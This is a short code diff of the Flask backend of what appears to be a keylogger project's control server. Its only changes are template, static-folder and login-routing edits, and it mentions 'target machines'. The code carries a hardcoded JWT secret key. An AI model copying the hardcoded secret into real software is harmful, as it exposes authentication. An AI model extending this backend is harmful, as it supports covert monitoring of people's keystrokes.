@@ -1,11 +1,12 @@
-from flask import Flask, request, jsonify,make_response,render_template
+from flask import Flask, request, jsonify,make_response
 from flask_cors import CORS
 from flask_jwt_extended import create_access_token, get_jwt_identity, jwt_required, JWTManager
 import os, random,string,datetime, json
 from ToolBox import merge_dicts,decrypt,generate_log_filename,get_date_list
 
 template_dir = os.path.abspath("/home/ubuntu/key_logger/KeyloggerProject-/KeyLoggerFrontEnd/templates")
-app = Flask(__name__,template_folder=template_dir)
+static_dir = os.path.abspath("/home/ubuntu/key_logger/KeyloggerProject-/KeyLoggerFrontEnd/static")
+app = Flask(__name__,template_folder=template_dir,static_folder=static_dir)
 CORS(app,supports_credentials=True)
 app.config['JWT_SECRET_KEY'] = 'q6Nj+unD<gn1*[>J+H!0hO[;rm_Xa'
 app.config['JWT_ACCESS_TOKEN_EXPIRES'] = datetime.timedelta(hours=1) 
@@ -152,7 +153,7 @@ def get_target_machines_list():
 @app.route('/login', methods=['POST','GET'])
 def login():
     if request.method == 'GET':
-        return render_template('login.html')
+        return login_user()
 
     data = request.json
     username = data.get("username")
